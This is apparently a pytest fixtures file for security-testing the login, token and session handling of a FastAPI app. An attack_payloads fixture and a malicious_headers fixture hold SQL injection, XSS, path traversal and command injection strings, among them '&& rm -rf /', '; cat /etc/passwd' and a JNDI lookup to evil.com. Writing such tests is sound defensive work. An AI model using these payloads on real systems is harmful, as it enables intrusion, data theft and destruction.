"""
Security test fixtures for session management and authentication testing.
Provides specialized fixtures for security testing scenarios.
"""

from __future__ import annotations

import asyncio
import secrets
import time
from datetime import datetime, timedelta
from typing import Any
from unittest.mock import Mock

import jwt
import pytest
from fastapi import Response
from httpx import AsyncClient

# from app.core.security import TokenManager as SecurityTokenManager
from app.models import User
from tests.mocks.redis_mock import MockRedis


@pytest.fixture
def security_settings():
    """Mock settings optimized for security testing."""
    mock_settings = Mock()
    mock_settings.ACCESS_TOKEN_EXPIRE_MINUTES = 15
    mock_settings.REFRESH_TOKEN_EXPIRE_DAYS = 30
    mock_settings.REFRESH_TOKEN_EXPIRE_MINUTES = 60
    mock_settings.SECRET_KEY = "test-secret-key-very-long-and-secure-for-testing"
    mock_settings.SESSION_SECRET_KEY = "test-session-secret-different-from-main-secret"
    mock_settings.REFRESH_COOKIE_NAME = "refresh_token"
    mock_settings.COOKIE_SECURE = True
    mock_settings.COOKIE_HTTPONLY = True
    mock_settings.COOKIE_SAMESITE = "lax"
    mock_settings.COOKIE_DOMAIN = None
    mock_settings.RATE_LIMIT_LOGIN = 5
    mock_settings.RATE_LIMIT_WINDOW = 300  # 5 minutes
    return mock_settings


@pytest.fixture
async def mock_redis_for_security():
    """Redis mock specifically configured for security testing."""
    redis_mock = MockRedis()

    # Pre-populate with some test data for security scenarios
    await redis_mock.set("blacklisted_token:test123", "1", ex=3600)
    await redis_mock.set("rate_limit:127.0.0.1:login", "3", ex=300)

    return redis_mock


@pytest.fixture
def mock_response():
    """Mock FastAPI Response for cookie testing."""
    response = Mock(spec=Response)
    response.set_cookie = Mock()
    response.delete_cookie = Mock()
    response.headers = {}
    return response


@pytest.fixture
def security_headers():
    """Standard security headers for testing."""
    return {
        "X-Forwarded-For": "127.0.0.1",
        "User-Agent": "Mozilla/5.0 SecurityTest/1.0",
        "Accept": "application/json",
        "Content-Type": "application/json",
    }


@pytest.fixture
def malicious_headers():
    """Headers with potential security issues for testing."""
    return {
        "X-Forwarded-For": "'; DROP TABLE users; --",
        "User-Agent": '<script>alert("XSS")</script>',
        "X-Real-IP": "192.168.1.1' OR '1'='1",
        "Origin": "https://malicious-site.com",
        "Referer": "javascript:alert('XSS')",
        "X-Custom-Header": "' UNION SELECT password FROM users WHERE id=1--",
    }


@pytest.fixture
def expired_tokens(security_settings):
    """Generate expired tokens for testing."""
    # Create tokens that are already expired
    past_time = datetime.utcnow() - timedelta(hours=1)

    expired_access_data = {
        "sub": "testuser",
        "exp": past_time.timestamp(),
        "type": "access",
    }

    expired_refresh_data = {
        "sub": "testuser",
        "exp": past_time.timestamp(),
        "type": "refresh",
        "jti": secrets.token_urlsafe(32),
    }

    expired_access_token = jwt.encode(
        expired_access_data, security_settings.SECRET_KEY, algorithm="HS256"
    )

    expired_refresh_token = jwt.encode(
        expired_refresh_data, security_settings.SESSION_SECRET_KEY, algorithm="HS256"
    )

    return {
        "access_token": expired_access_token,
        "refresh_token": expired_refresh_token,
        "access_data": expired_access_data,
        "refresh_data": expired_refresh_data,
    }


@pytest.fixture
def malformed_tokens():
    """Generate malformed tokens for testing."""
    return [
        "not.a.jwt.token",
        "Bearer invalid-token",
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid.signature",
        "",
        "null",
        "undefined",
        "{'fake': 'json'}",
        "x" * 1000,  # Very long token
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..signature_missing_payload",
        "header.payload",  # Missing signature
        "a.b.c.d.e",  # Too many parts
    ]


@pytest.fixture
async def multiple_sessions_user(admin_user: User, async_client: AsyncClient):
    """Create multiple active sessions for a user."""
    sessions = []

    for i in range(5):
        login_data = {
            "username": admin_user.username,
            "password": "testpassword123",
            "remember_me": True,
        }

        response = await async_client.post("/api/auth/login", json=login_data)
        if response.status_code == 200:
            token_data = response.json()
            sessions.append({
                "access_token": token_data["access_token"],
                "refresh_cookie": None,  # Would be extracted from cookies in real scenario
                "session_id": f"session_{i}_{secrets.token_hex(8)}",
            })

    return {"user": admin_user, "sessions": sessions}


@pytest.fixture
def attack_payloads():
    """Common attack payloads for security testing."""
    return {
        "sql_injection": [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' UNION SELECT * FROM users --",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.columns GROUP BY x)a) --",
        ],
        "xss": [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            "javascript:alert('XSS')",
            '<img src=x onerror=alert("XSS")>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<svg onload=alert("XSS")>',
            '<body onload=alert("XSS")>',
            'eval("alert(1)")',
            'setTimeout("alert(1)",1)',
        ],
        "command_injection": [
            "; cat /etc/passwd",
            "| whoami",
            "&& rm -rf /",
            "`id`",
            "$(whoami)",
            "${jndi:ldap://evil.com/a}",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
        ],
    }


@pytest.fixture
async def rate_limited_client(async_client: AsyncClient, admin_user: User):
    """Client that has hit rate limits."""
    # Simulate hitting rate limits with failed login attempts
    for _ in range(10):
        await async_client.post(
            "/api/auth/login",
            json={"username": admin_user.username, "password": "wrong_password"},
        )

    return async_client


@pytest.fixture
def session_fixation_data():
    """Data for testing session fixation attacks."""
    return {
        "old_session_id": "attacker_controlled_session_12345",
        "old_refresh_token": "attacker_injected_refresh_token",
        "csrf_token": "attacker_csrf_token",
        "cookies": {
            "session_id": "old_session_value",
            "refresh_token": "old_refresh_value",
            "csrf_token": "old_csrf_value",
        },
    }


@pytest.fixture
def timing_attack_data():
    """Data for timing attack testing."""
    return {
        "valid_usernames": ["admin", "testuser", "user1"],
        "invalid_usernames": ["nonexistent", "hacker", "attacker"],
        "valid_passwords": ["testpassword123", "admin123"],
        "invalid_passwords": ["wrong", "invalid", "123456"],
        "test_iterations": 10,
    }


@pytest.fixture
def concurrent_login_clients():
    """Multiple concurrent clients for load testing."""
    # In a real test, you'd create actual AsyncClient instances
    # This is a placeholder for the concept
    return [
        {
            "client_id": f"client_{i}",
            "ip_address": f"192.168.1.{i + 1}",
            "user_agent": f"TestClient/{i}",
        }
        for i in range(20)
    ]


@pytest.fixture
def security_test_config():
    """Configuration for security tests."""
    return {
        "max_login_attempts": 5,
        "lockout_duration": 300,  # 5 minutes
        "session_timeout": 1800,  # 30 minutes
        "max_concurrent_sessions": 5,
        "token_rotation_interval": 900,  # 15 minutes
        "csrf_token_expiry": 3600,  # 1 hour
        "secure_cookie_age": 86400,  # 24 hours
        "remember_me_age": 2592000,  # 30 days
    }


class SecurityTestHelper:
    """Helper class for security testing operations."""

    @staticmethod
    async def create_blacklisted_token(
        redis_mock: MockRedis, token: str, ttl: int = 3600
    ):
        """Add a token to the blacklist."""
        await redis_mock.set(f"blacklisted_token:{token}", "1", ex=ttl)

    @staticmethod
    async def simulate_rate_limit_hit(
        redis_mock: MockRedis, ip: str, attempts: int = 6
    ):
        """Simulate hitting rate limits for an IP."""
        await redis_mock.set(f"rate_limit:{ip}:login", str(attempts), ex=300)

    @staticmethod
    def generate_malicious_jwt(payload: dict, secret: str = "wrong_secret") -> str:
        """Generate a JWT with malicious payload or wrong signature."""
        return jwt.encode(payload, secret, algorithm="HS256")

    @staticmethod
    def measure_response_time(func):
        """Decorator to measure function response time."""

        async def wrapper(*args, **kwargs):
            start_time = time.time()
            result = await func(*args, **kwargs)
            end_time = time.time()
            return result, end_time - start_time

        return wrapper

    @staticmethod
    async def create_session_with_metadata(
        redis_mock: MockRedis,
        session_id: str,
        user_id: str,
        ip_address: str = "127.0.0.1",
        user_agent: str = "TestAgent",
        ttl: int = 1800,
    ):
        """Create a session with additional security metadata."""
        session_data = {
            "user_id": user_id,
            "ip_address": ip_address,
            "user_agent": user_agent,
            "created_at": datetime.utcnow().isoformat(),
            "last_activity": datetime.utcnow().isoformat(),
        }

        await redis_mock.hset(f"session:{session_id}", "data", str(session_data))
        await redis_mock.expire(f"session:{session_id}", ttl)
        return session_data


@pytest.fixture
def security_helper():
    """Provide security test helper."""
    return SecurityTestHelper()


# Parameterized fixtures for different security scenarios
@pytest.fixture(
    params=[
        {"remember_me": True, "expected_duration": 30 * 24 * 60 * 60},
        {"remember_me": False, "expected_duration": 60 * 60},
    ]
)
def token_duration_scenarios(request):
    """Test scenarios for different token durations."""
    return request.param


@pytest.fixture(params=["127.0.0.1", "192.168.1.100", "10.0.0.50", "172.16.0.20"])
def test_ip_addresses(request):
    """Different IP addresses for rate limiting tests."""
    return request.param


@pytest.fixture(
    params=[
        {"attempts": 3, "should_block": False},
        {"attempts": 5, "should_block": False},
        {"attempts": 6, "should_block": True},
        {"attempts": 10, "should_block": True},
    ]
)
def rate_limit_scenarios(request):
    """Rate limiting test scenarios."""
    return request.param


# Async context managers for security testing
class SecurityTestContext:
    """Context manager for security testing setup and teardown."""

    def __init__(self, redis_mock: MockRedis):
        self.redis_mock = redis_mock
        self.initial_state: dict[str, Any] = {}

    async def __aenter__(self):
        # Save initial state
        self.initial_state = dict(self.redis_mock.data)
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        # Cleanup - restore initial state
        self.redis_mock.data.clear()
        self.redis_mock.data.update(self.initial_state)
        self.redis_mock.expires.clear()


@pytest.fixture
def security_context(mock_redis_for_security):
    """Security test context fixture."""
    return SecurityTestContext(mock_redis_for_security)


# Mock for simulating network conditions
class NetworkConditionMock:
    """Mock for simulating different network conditions."""

    def __init__(self, latency: float = 0.0, packet_loss: float = 0.0):
        self.latency = latency
        self.packet_loss = packet_loss

    async def apply_conditions(self, func):
        """Apply network conditions to a function call."""
        if self.packet_loss > 0:
            import random  # noqa: PLC0415

            if random.random() < self.packet_loss:
                msg = "Simulated packet loss"
                raise ConnectionError(msg)

        if self.latency > 0:
            await asyncio.sleep(self.latency)

        return await func()


@pytest.fixture
def network_conditions():
    """Network condition simulator."""
    return NetworkConditionMock()


# Fixtures for testing specific security vulnerabilities
@pytest.fixture
def session_hijacking_scenario():
    """Data for session hijacking tests."""
    return {
        "legitimate_session": {
            "session_id": "legit_session_123",
            "user_id": "user123",
            "ip_address": "192.168.1.100",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        },
        "hijacker_session": {
            "session_id": "legit_session_123",  # Same session ID
            "user_id": "user123",
            "ip_address": "192.168.1.200",  # Different IP
            "user_agent": "curl/7.68.0",  # Different User-Agent
        },
    }


@pytest.fixture
def csrf_attack_scenario():
    """Data for CSRF attack tests."""
    return {
        "legitimate_origin": "https://example.com",
        "malicious_origins": [
            "https://evil.com",
            "http://malicious-site.com",
            "javascript:alert('xss')",
            "data:text/html,<script>alert(1)</script>",
        ],
        "state_changing_endpoints": [
            "/api/auth/logout",
            "/api/auth/revoke-all-sessions",
            "/api/photos",
            "/api/projects",
        ],
    }


@pytest.fixture
def clickjacking_headers():
    """Headers for clickjacking protection tests."""
    return {
        "X-Frame-Options": "DENY",
        "Content-Security-Policy": "frame-ancestors 'none'",
        "X-Content-Type-Options": "nosniff",
        "X-XSS-Protection": "1; mode=block",
    }


# Integration fixtures combining multiple security components
@pytest.fixture
async def full_security_test_setup(
    mock_redis_for_security, security_settings, admin_user: User, security_helper
):
    """Complete security test setup with all components."""
    # Setup Redis with test data
    redis_mock = mock_redis_for_security

    # Create some baseline security state
    await security_helper.create_blacklisted_token(redis_mock, "blacklisted123")
    await security_helper.simulate_rate_limit_hit(redis_mock, "192.168.1.100", 6)

    # Create active sessions
    await security_helper.create_session_with_metadata(
        redis_mock,
        "active_session_1",
        str(admin_user.id),
        "192.168.1.50",
        "TestAgent/1.0",
    )

    return {
        "redis_mock": redis_mock,
        "settings": security_settings,
        "user": admin_user,
        "helper": security_helper,
    }
